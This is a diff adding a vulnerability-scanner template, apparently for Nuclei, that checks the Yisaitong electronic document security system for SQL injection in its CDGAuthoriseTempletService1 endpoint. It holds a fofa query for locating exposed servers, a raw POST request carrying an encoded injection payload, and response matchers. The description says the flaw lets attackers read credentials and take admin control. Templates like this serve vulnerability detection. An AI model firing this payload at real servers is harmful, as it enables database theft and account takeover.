@@ -1,0 +1,38 @@
+id: yisaitong-CDGAuthoriseTempletService1-sql
+info:
+  name: "亿赛通电子文档安全管理系统 CDGAuthoriseTempletService1 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/CDGServer3/index.jsp"
+    亿赛通电子文档安全管理系统 CDGAuthoriseTempletService1 接口存在SQL注入安全缺陷。攻击者可通过构造恶意POST请求参数，向数据库注入特制SQL指令，实现任意SQL代码执行。该漏洞允许攻击者绕过认证机制，直接读取数据库中的用户凭证信息，通过MD5哈希破解可获取系统管理权限，导致整个文档管理系统面临数据泄露和权限失控风险。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486211&idx=1&sn=582c581dbf632c105f88192a46f0c8ae&chksm=c267be30f5103726590a8b90a6b6ed82444feffb71c43387261b8615aef2f7069ec143327e3e&token=1742030890&lang=zh_CN#rd
+  tags: 亿赛通
+
+
+http:
+- raw:
+  - |
+    POST /CDGServer3/CDGAuthoriseTempletService1 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    Content-Type: application/xml
+
+    CGKFAICMPFGICCPHKFGGGBOMICMOKOBGPCBLKPCAHAGPFJHFABCPPKIOHIAIBJLLHJCODJMAGKBGIKDAFJHJMMKBDHABAJPBFNLBOIDFBHMMFKFHLPIAOPHEOAICJEMBCKFEIPGINHHBEGDOMEOPDKJGPNIJEDNOMEKLJHCGOJCEIPFPEDGBEHJLMNEEFIKFPGCCKCFCCOMONKACOEENLFIBAGNJBLHDEJCIPHOPDOAMGLINIEJDIFOLLGEDIDMDAKIPEINHHOFBOHLPEJBPJBKJLDDEIFOGLGHKANECEEGNDCNMJNLNJBFKNGKKJFODMFEKBOGFNDNJMCMHOFJBLGHEBALFGNNGLPBMKHHHGNKNHJGLFLODDIKAAOOOAJAEMBLBNMGOFJELPABKOEGMFLIBGPMHJPEJCKFBGHHNGMDAJBKBNNMIMFELPGEHDFGNHMBLEIKMINOAOAINBLEOIGHAMOPDNOIFFEFLGBFOFAGACH
+
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'MEOGCAKA'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
